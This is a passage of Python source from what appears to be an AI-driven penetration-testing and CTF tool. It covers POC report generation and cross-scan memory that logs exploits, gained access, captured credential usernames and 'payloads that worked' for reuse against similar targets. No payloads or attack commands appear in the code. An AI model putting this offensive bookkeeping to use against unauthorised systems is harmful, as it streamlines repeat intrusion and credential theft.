                max_tokens=8000,
            )
            
            km.record_success(response.usage.total_tokens if response.usage else 0)
            
            poc_text = response.choices[0].message.content or ""
            
            # Wrap in a nice frame
            header = (
                "═══════════════════════════════════════════════════════════════\n"
                "              🎯 PROOF OF CONCEPT (POC) REPORT\n"
                "═══════════════════════════════════════════════════════════════\n"
            )
            footer = (
                "\n═══════════════════════════════════════════════════════════════\n"
                f"  Generated via AI analysis | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"  Target: {self.current_target} | Tools executed: {len(self.tool_history)}\n"
                "═══════════════════════════════════════════════════════════════"
            )
            
            return header + poc_text + footer
            
        except Exception as e:
            logger.error(f"POC AI generation failed: {e}")
            # Fallback: generate a basic report from raw data
            return self._generate_fallback_poc(finding_type)
    
    def _generate_fallback_poc(self, finding_type: str = "all") -> str:
        """
        Fallback POC generation using actual tool history (no AI).
        Used when API call fails.
        """
        with self._lock:
            lines = [
                "═══════════════════════════════════════════════════════════════",
                "              🎯 PROOF OF CONCEPT (POC) REPORT",
                "             (Fallback — API unavailable)",
                "═══════════════════════════════════════════════════════════════",
                f"Target: {self.current_target or 'N/A'}",
                f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                f"Total Commands Executed: {len(self.tool_history)}",
                "═══════════════════════════════════════════════════════════════\n"
            ]
            
            # ── Vulnerabilities Section ──
            if finding_type in ["all", "vulns", "vulnerabilities"]:
                vulns = self.findings.get("vulnerabilities", [])
                if vulns:
                    lines.append("## 🔴 VULNERABILITIES FOUND\n")
                    for i, v in enumerate(vulns, 1):
                        lines.append(f"### {i}. [{v.get('severity', 'N/A').upper()}] {v['name']}")
                        if v.get('cve'):
                            lines.append(f"   CVE: {v['cve']}")
                        if v.get('details'):
                            lines.append(f"   Details: {v['details'][:500]}")
                        if v.get('tool'):
                            lines.append(f"   Discovered by: {v['tool']}")
                        
                        # Find related commands from tool history
                        related_cmds = [
                            h for h in self.tool_history 
                            if h.get('tool') == v.get('tool') or 
                            v['name'].lower() in h.get('result_summary', '').lower()
                        ]
                        if related_cmds:
                            lines.append("\n   📋 Related Commands Executed:")
                            for cmd_entry in related_cmds:
                                lines.append(f"   $ {cmd_entry.get('command', 'N/A')}")
                                result = cmd_entry.get('result_summary', '')
                                if result:
                                    # Show first 300 chars of output
                                    lines.append(f"   → {result[:300]}")
                        lines.append("\n" + "─" * 63)
            
            # ── Exploits Section ──
            if finding_type in ["all", "exploits"]:
                exploits = self.findings.get("exploits", [])
                if exploits:
                    lines.append("\n## 💥 SUCCESSFUL EXPLOITS\n")
                    for e in exploits:
                        lines.append(f"  • {e['name']} — Success: {e.get('success', False)}")
                        if e.get('result'):
                            lines.append(f"    Result: {e['result']}")
                        lines.append("")
            
            # ── Access Section ──
            if finding_type in ["all", "access"]:
                access = self.findings.get("access", [])
                if access:
                    lines.append("\n## 🎯 ACCESS GAINED\n")
                    for a in access:
                        lines.append(f"  • {a['type']} access as {a['user']} ({a['privilege']})")
                    lines.append("")
            
            # ── Credentials Section ──
            if finding_type in ["all", "creds", "credentials"]:
                creds = self.findings.get("credentials", [])
                if creds:
                    lines.append("\n## 🔑 CREDENTIALS\n")
                    for c in creds[:10]:
                        lines.append(f"  • {c['username']} ({c['type']}) — Source: {c.get('source', 'N/A')}")
                    lines.append("")
            
            # ── Ports Section ──
            if finding_type in ["all", "ports"]:
                ports = self.findings.get("ports", [])
                if ports:
                    lines.append("\n## 🔌 OPEN PORTS\n")
                    for p in ports:
                        lines.append(f"  • {p['port']}/{p.get('service', '?')} — {p.get('version', '')}")
                    lines.append("")
            
            # ── Full Command Timeline ──
            if self.tool_history:
                lines.append("\n## 📜 FULL COMMAND TIMELINE\n")
                for i, h in enumerate(self.tool_history, 1):
                    status = "✓" if h.get("success") else "✗"
                    lines.append(f"  {i}. [{status}] {h.get('command', h['tool'])}")
                    lines.append(f"     Agent: {h.get('agent', 'N/A')} | Time: {h.get('timestamp', 'N/A')}")
                lines.append("")
            
            # ── Summary ──
            vuln_count = len(self.findings.get("vulnerabilities", []))
            exploit_count = len(self.findings.get("exploits", []))
            access_count = len(self.findings.get("access", []))
            
            lines.append("\n## 📊 Summary")
            lines.append(f"  Commands Executed: {len(self.tool_history)}")
            lines.append(f"  Vulnerabilities: {vuln_count}")
            lines.append(f"  Exploits: {exploit_count}")
            lines.append(f"  Access Gained: {access_count}")
            
            lines.append("\n═══════════════════════════════════════════════════════════════")
            
            return "\n".join(lines)

    def generate_poc(self, finding_type: str = "all") -> str:
        """
        Generate POC report — calls AI for proper report generation.
        Falls back to template if API unavailable.
        """
        return self.generate_poc_with_ai(finding_type)


# Global context hub instance
_context_hub: Optional[ContextHub] = None


def get_context_hub() -> ContextHub:
    """Get the global context hub instance."""
    global _context_hub
    if _context_hub is None:
        _context_hub = ContextHub.get_instance()
    return _context_hub


# =============================================================================
# Phase 5 — Cross-Scan Learning (ScanMemory)
# Persists tool success, confirmed vulns, and payloads across engagements so
# agents can query "what worked before against PHP+MySQL" or "best tools for
# finding XSS historically".
# Storage: data/execution_history.json (flat JSON, human-readable)
# =============================================================================

import uuid as _uuid
import collections as _collections

_HISTORY_FILE = Path(__file__).resolve().parents[2] / "data" / "execution_history.json"
_HISTORY_VERSION = "1.0"


def _load_history() -> Dict:
    """Load execution_history.json, returning empty scaffold if missing/corrupt."""
    try:
        if _HISTORY_FILE.exists():
            with open(_HISTORY_FILE, "r", encoding="utf-8") as fh:
                data = json.load(fh)
                if isinstance(data, dict) and "scans" in data:
                    if "ctf_challenges" not in data:
                        data["ctf_challenges"] = []
                    return data
    except Exception:
        pass
    return {
        "_meta": {"version": _HISTORY_VERSION, "total_scans": 0, "total_ctf": 0},
        "scans": [],
        "ctf_challenges": []
    }


def _save_history(data: Dict) -> None:
    """Persist history dict to disk, creating parent dirs as needed."""
    try:
        _HISTORY_FILE.parent.mkdir(parents=True, exist_ok=True)
        data["_meta"]["total_scans"] = len(data.get("scans", []))
        data["_meta"]["total_ctf"] = len(data.get("ctf_challenges", []))
        with open(_HISTORY_FILE, "w", encoding="utf-8") as fh:
            json.dump(_utf8_safe(data), fh, indent=2, ensure_ascii=False, default=str)
    except Exception as exc:
        logger.warning(f"ScanMemory: could not save history — {exc}")


class ScanMemory:
    """
    Cross-Scan Learning engine.

    Records tool calls, confirmed vulnerabilities, working payloads, and
    detected tech stacks from every engagement.  Answers queries like:
      - "which tools found XSS before?"
      - "what payloads worked against PHP+MySQL targets?"
      - "what vulnerabilities were found on WordPress sites?"
      - "give me stats across all scans"

    Storage: data/execution_history.json  (auto-created on first write)
    """

    # ── Public write API ──────────────────────────────────────────────────

    def record_scan(
        self,
        target: str,
        tech_stack: List[str],
        scan_type: str,
        vulns_found: List[Dict],
        tools_executed: List[str],
        waf_detected: str = "",
        chains_triggered: List[str] = None,
        notes: str = "",
    ) -> str:
        """
        Persist a completed scan to execution_history.json.

        Args:
            target:          Target hostname/IP
            tech_stack:      Detected technologies e.g. ["PHP", "MySQL", "WordPress"]
            scan_type:       "web_application" | "windows_domain" | "linux_server" | etc.
            vulns_found:     List of dicts with keys: vuln_id, severity, tool, payload,
                             validated (bool), validation_score (int), endpoint
            tools_executed:  All tools called during the scan
            waf_detected:    WAF name if detected, empty string otherwise
            chains_triggered: Chain IDs that fired (from Phase 4 ChainEngine)
            notes:           Free-text notes

        Returns:
            The new scan_id (UUID8).
        """
        scan_id = _uuid.uuid4().hex[:12]
        history = _load_history()

        scan_record = {
            "scan_id":        scan_id,
            "timestamp":      datetime.now().isoformat(),
            "target":         target,
            "target_type":    scan_type,
            "tech_stack":     [t.lower().strip() for t in tech_stack],
            "waf_detected":   waf_detected,
            "vulns_found":    vulns_found or [],
            "tools_executed": tools_executed or [],
            "chains_triggered": chains_triggered or [],
            "notes":          notes,
        }

        history["scans"].append(scan_record)
        # Keep at most 500 scan records
        if len(history["scans"]) > 500:
            history["scans"] = history["scans"][-500:]

        _save_history(history)
        logger.info(f"ScanMemory: recorded scan {scan_id} for {target} ({len(vulns_found or [])} vulns)")
        return scan_id

    # ── Public query API ─────────────────────────────────────────────────

    def recommend_tools(self, tech_stack: str = "", scan_type: str = "") -> str:
        """
        Recommend tools based on what historically found vulnerabilities against
        a given technology stack or scan type.

        Counts confirmed (validated=True) vuln hits per tool, filtered by matching
        tech_stack tokens and/or scan_type.

        Returns markdown report.
        """
        history = _load_history()
        scans = history["scans"]

        if not scans:
            return "No scan history yet. Run `record_scan_findings` after an engagement to start building the knowledge base."

        techs = [t.lower().strip() for t in tech_stack.replace(",", " ").split() if t.strip()]
        scan_type_lc = scan_type.lower().strip()

        # Filter scans to those matching the query
        matched_scans = []
        for s in scans:
            if techs and not any(t in s["tech_stack"] for t in techs):
                continue
            if scan_type_lc and scan_type_lc not in s.get("target_type", "").lower():
                continue
            matched_scans.append(s)

        if not matched_scans:
            qualifier = f"tech_stack='{tech_stack}'" if tech_stack else f"scan_type='{scan_type}'"
            return f"No matching historical scans for {qualifier}. Showing global stats instead.\n\n" + self._global_tool_stats(scans)

        # Count tool → confirmed vuln hits
        tool_hits: Dict[str, int] = _collections.defaultdict(int)
        tool_vulns: Dict[str, set] = _collections.defaultdict(set)
        for s in matched_scans:
            for v in s.get("vulns_found", []):
                if v.get("validated"):
                    t = v.get("tool", "unknown")
                    tool_hits[t] += 1
                    tool_vulns[t].add(v.get("vuln_id", "?"))

        if not tool_hits:
            return f"No validated findings in {len(matched_scans)} matching scan(s). Tools executed: {', '.join(set(t for s in matched_scans for t in s.get('tools_executed', [])))}"

        qualifier_str = ""
        if techs:
            qualifier_str += f"tech_stack: {', '.join(techs)}  "
        if scan_type_lc:
            qualifier_str += f"scan_type: {scan_type_lc}"

        lines = [
            "## Tool Recommendations from Scan History",
            f"**Filter:** {qualifier_str or 'all scans'}  |  **Matched scans:** {len(matched_scans)}",
            "",
            "| Rank | Tool | Confirmed Hits | Vuln Types Found |",
            "|---|---|---|---|",
        ]
        ranked = sorted(tool_hits.items(), key=lambda x: -x[1])
        for i, (tool, hits) in enumerate(ranked[:15], 1):
            vulns_str = ", ".join(sorted(tool_vulns[tool]))[:80]
            lines.append(f"| {i} | `{tool}` | {hits} | {vulns_str} |")

        lines.append("")
        lines.append("> Based on validated findings only. Prioritise top-ranked tools for similar targets.")
        return "\n".join(lines)

    def what_worked_before(self, vuln_type: str) -> str:
        """
        Return the tools and payloads that historically confirmed a given
        vulnerability type.  Includes which tech stacks it was found on and
        what validation score was achieved.

        Args:
            vuln_type: Vuln ID from the KB (e.g. 'sqli_error_based', 'xss_reflected', 'ssrf')

        Returns:
            Markdown report of historical wins.
        """
        history = _load_history()
        vuln_lc = vuln_type.lower().strip()

        hits = []
        for s in history["scans"]:
            for v in s.get("vulns_found", []):
                vid = v.get("vuln_id", "").lower()
                if vuln_lc in vid or vid in vuln_lc:
                    hits.append({
                        "target":    s["target"],
                        "tech":      ", ".join(s["tech_stack"]) or "unknown",
                        "tool":      v.get("tool", ""),
                        "payload":   v.get("payload", ""),
                        "endpoint":  v.get("endpoint", ""),
                        "score":     v.get("validation_score", 0),
                        "validated": v.get("validated", False),
                        "ts":        s["timestamp"][:10],
                    })

        if not hits:
            return f"No historical data for vuln_type='{vuln_type}'. This type has not been confirmed in any recorded scan yet."

        hits.sort(key=lambda x: -x["score"])

        # Best tools
        tool_count: Dict[str, int] = _collections.Counter(h["tool"] for h in hits)
        # Best payloads (deduplicated, non-empty)
        payload_count: Dict[str, int] = _collections.Counter(
            h["payload"] for h in hits if h["payload"]
        )
        # Tech stacks
        tech_count: Dict[str, int] = _collections.Counter(h["tech"] for h in hits)

        lines = [
            f"## Historical Data: `{vuln_type}`",
            f"**Confirmed occurrences:** {len(hits)}  |  **Validated:** {sum(1 for h in hits if h['validated'])}",
            "",
            "### Best Tools",
            "| Tool | Confirmed Times |",
            "|---|---|",
        ]
        for tool, cnt in tool_count.most_common(8):
            lines.append(f"| `{tool}` | {cnt} |")

        if payload_count:
            lines += [
                "",
                "### Payloads That Worked",
                "| Payload | Times Confirmed |",
                "|---|---|",
            ]
            for payload, cnt in payload_count.most_common(10):
                lines.append(f"| `{payload[:80]}` | {cnt} |")

        lines += [
            "",
            "### Tech Stacks Where Found",
            "| Tech Stack | Times |",
            "|---|---|",
        ]
        for tech, cnt in tech_count.most_common(8):
            lines.append(f"| {tech} | {cnt} |")

        lines += [
            "",
            "### Recent Occurrences (newest 5)",
            "| Date | Target | Tool | Score | Endpoint |",
            "|---|---|---|---|---|",
        ]
        for h in hits[:5]:
            endpoint = (h["endpoint"] or "—")[:50]
            lines.append(f"| {h['ts']} | {h['target']} | `{h['tool']}` | {h['score']} | {endpoint} |")

        return "\n".join(lines)

    def scan_history_stats(self) -> str:
        """
        Return aggregate statistics across all recorded scans:
        top tools, top vuln types, tech stacks, validation rates,
        WAFs encountered, and exploit chains triggered.

        Returns:
            Markdown statistics report.
        """
        history = _load_history()
        scans = history["scans"]

        if not scans:
            return "No scan history recorded yet. Run `record_scan_findings` after completing an engagement."

        total_vulns = sum(len(s.get("vulns_found", [])) for s in scans)
        validated_vulns = sum(
            sum(1 for v in s.get("vulns_found", []) if v.get("validated"))
            for s in scans
        )
        total_tools = sum(len(s.get("tools_executed", [])) for s in scans)

        # Aggregate counters
        vuln_counter:    Dict[str, int] = _collections.Counter()
        tool_counter:    Dict[str, int] = _collections.Counter()
        tech_counter:    Dict[str, int] = _collections.Counter()
        waf_counter:     Dict[str, int] = _collections.Counter()
        chain_counter:   Dict[str, int] = _collections.Counter()
        scan_type_ctr:   Dict[str, int] = _collections.Counter()
        severity_ctr:    Dict[str, int] = _collections.Counter()

        for s in scans:
            for v in s.get("vulns_found", []):
                vuln_counter[v.get("vuln_id", "unknown")] += 1
                severity_ctr[v.get("severity", "unknown")] += 1
            for t in s.get("tools_executed", []):
                tool_counter[t] += 1
            for tech in s.get("tech_stack", []):
                tech_counter[tech] += 1
            if s.get("waf_detected"):
                waf_counter[s["waf_detected"]] += 1
            for c in s.get("chains_triggered", []):
                chain_counter[c] += 1
            scan_type_ctr[s.get("target_type", "unknown")] += 1

        validation_rate = f"{int(validated_vulns / total_vulns * 100)}%" if total_vulns else "n/a"

        def _top(ctr, n=8):
            return ctr.most_common(n)

        lines = [
            "## Cross-Scan Learning — History Statistics",
            "",
            "| Metric | Value |",
            "|---|---|",
            f"| Total scans recorded   | {len(scans)} |",
            f"| Total vulns found      | {total_vulns} |",
            f"| Validated vulns        | {validated_vulns} ({validation_rate}) |",
            f"| Total tool calls       | {total_tools} |",
            f"| Unique vuln types      | {len(vuln_counter)} |",
            f"| Unique tools used      | {len(tool_counter)} |",
            "",
            "### Top Vulnerability Types",
            "| Vuln ID | Times Found |",
            "|---|---|",
        ]
        for vid, cnt in _top(vuln_counter):
            lines.append(f"| `{vid}` | {cnt} |")

        lines += [
            "",
            "### Top Tools (by executions)",
            "| Tool | Executions |",
            "|---|---|",
        ]
        for tool, cnt in _top(tool_counter):
            lines.append(f"| `{tool}` | {cnt} |")

        lines += [
            "",
            "### Tech Stacks Encountered",
            "| Technology | Scans |",
            "|---|---|",
        ]
        for tech, cnt in _top(tech_counter):
            lines.append(f"| {tech} | {cnt} |")

        if waf_counter:
            lines += [
                "",
                "### WAFs Detected",
                "| WAF | Encounters |",
                "|---|---|",
            ]
            for waf, cnt in _top(waf_counter):
                lines.append(f"| {waf} | {cnt} |")

        if chain_counter:
            lines += [
                "",
                "### Exploit Chains Triggered",
                "| Chain ID | Times |",
                "|---|---|",
            ]
            for chain, cnt in _top(chain_counter):
                lines.append(f"| `{chain}` | {cnt} |")

        lines += [
            "",
            "### Scan Types Distribution",
            "| Type | Scans |",
            "|---|---|",
        ]
        for st, cnt in _top(scan_type_ctr):
            lines.append(f"| {st} | {cnt} |")

        severity_order = ["critical", "high", "medium", "low", "info"]
        lines += ["", "### Severity Breakdown"]
        for sev in severity_order:
            if sev in severity_ctr:
                lines.append(f"  {sev.upper():10s}: {severity_ctr[sev]}")

        return "\n".join(lines)

    def _global_tool_stats(self, scans: List[Dict]) -> str:
        """Internal: global tool stats regardless of filter."""
        tool_hits: Dict[str, int] = _collections.defaultdict(int)
        for s in scans:
            for v in s.get("vulns_found", []):
                if v.get("validated"):
                    tool_hits[v.get("tool", "unknown")] += 1
        if not tool_hits:
            return "No validated findings in any recorded scan."
        lines = [
            "### Global Tool Hit Rates (all scans)",
            "| Tool | Confirmed Hits |",
            "|---|---|",
        ]
        for tool, cnt in sorted(tool_hits.items(), key=lambda x: -x[1])[:10]:
            lines.append(f"| `{tool}` | {cnt} |")
        return "\n".join(lines)


# Shared instance
_scan_memory: Optional["ScanMemory"] = None


def get_scan_memory() -> "ScanMemory":
    """Get the shared ScanMemory instance."""
    global _scan_memory
    if _scan_memory is None:
        _scan_memory = ScanMemory()
    return _scan_memory


class CTFHistory:
    """
    Cross-Challenge Learning engine for CTF.
    Records successful techniques, solver scripts, and tips.
    """

    def record_solution(
        self,
        challenge_name: str,
        category: str,
        techniques: List[str],
        working_commands: List[str],
        notes: str = "",
        files_involved: List[str] = None
    ) -> str:
        """Persist a successful CTF solution."""
        challenge_id = _uuid.uuid4().hex[:8]
        history = _load_history()

        record = {
            "challenge_id": challenge_id,
            "timestamp": datetime.now().isoformat(),
            "name": challenge_name,
            "category": category.lower(),
            "techniques": [t.lower() for t in techniques],
            "commands": working_commands,
            "notes": notes,
            "files": files_involved or []
        }

        history["ctf_challenges"].append(record)
        # Keep at most 200 records
        if len(history["ctf_challenges"]) > 200:
            history["ctf_challenges"] = history["ctf_challenges"][-200:]

        _save_history(history)
        logger.info(f"CTFHistory: recorded solution for {challenge_name} ({category})")

        # Also persist to ChromaDB for semantic recall across sessions
        try:
            from src.sdk.memory import get_memory
            mem = get_memory()
            if mem:
                content = (
                    f"[CTF SOLUTION] {challenge_name} [{category.upper()}]\n"
                    f"Techniques: {', '.join(techniques)}\n"
                    f"Notes: {notes}\n"
                    f"Commands: {'; '.join(working_commands[:5])}"
                )
                mem.store(
                    target="ctf_global",
                    content=content,
                    category="ctf_solution",
                    metadata={
                        "challenge_name": challenge_name,
                        "ctf_category": category.lower(),
                        "techniques": json.dumps(techniques),
                        "challenge_id": challenge_id,
                    },
                )
        except Exception as _e:
            logger.debug(f"CTFHistory: ChromaDB persist failed (non-fatal): {_e}")

        return challenge_id

    def query_tips(self, category: str = "", keywords: str = "") -> str:
        """Search historical solutions for tips and techniques."""
        history = _load_history()
        challenges = history.get("ctf_challenges", [])
        if not challenges:
            return "No CTF history recorded yet. Use `record_ctf_solution` to build the knowledge base."

        kws = [k.lower().strip() for k in keywords.replace(",", " ").split() if k.strip()]
        cat_match = category.lower().strip()

        matches = []
        for c in challenges:
            if cat_match and cat_match != c["category"]:
                continue
            if kws:
                searchable = (c["name"] + " " + " ".join(c["techniques"]) + " " + c["notes"]).lower()
                if not any(kw in searchable for kw in kws):
                    continue
            matches.append(c)

        if not matches:
            return f"No historical matches found for category='{category}' keywords='{keywords}'."

        lines = [f"## CTF Historical Tips & Techniques ({len(matches)} matches)"]
        for c in matches[:10]: # Top 10 matches
            lines.append(f"\n### {c['name']} [{c['category'].upper()}]")
            lines.append(f"**Techniques:** {', '.join(c['techniques'])}")
            if c['notes']:
                lines.append(f"**Tips:** {c['notes']}")
            if c['commands']:
                lines.append("**Working Commands:**")
                for cmd in c['commands'][:3]:
                    lines.append(f"  `{cmd}`")
        
        return "\n".join(lines)

    def semantic_search(self, description: str, category: str = "", limit: int = 5) -> list:
        """
        Semantic search of historical CTF solutions using ChromaDB.

        Falls back to empty list if ChromaDB is unavailable so callers can
        chain with keyword-search without special-casing.

        Args:
            description: Natural-language description of the current challenge.
            category:    Optional category filter ("pwn", "rev", "crypto", etc.).
            limit:       Max results to return.

        Returns:
            List of dicts with keys: content, metadata, distance.
        """
        try:
            from src.sdk.memory import get_memory
            mem = get_memory()
            if not mem:
                return []
            # Build a rich query so semantic search finds algorithm-type matches
            query_parts = [f"CTF challenge: {description}"]
            if category:
                query_parts.append(f"category: {category}")
            query = " ".join(query_parts)
            results = mem.search(
                query,
                target="ctf_global",
                category="ctf_solution",
                limit=limit,
            )
            return results or []
        except Exception as _e:
            logger.debug(f"CTFHistory semantic_search failed: {_e}")
            return []


_ctf_history: Optional[CTFHistory] = None


def get_ctf_history() -> CTFHistory:
    """Get the shared CTFHistory instance."""
    global _ctf_history
    if _ctf_history is None:
        _ctf_history = CTFHistory()
    return _ctf_history
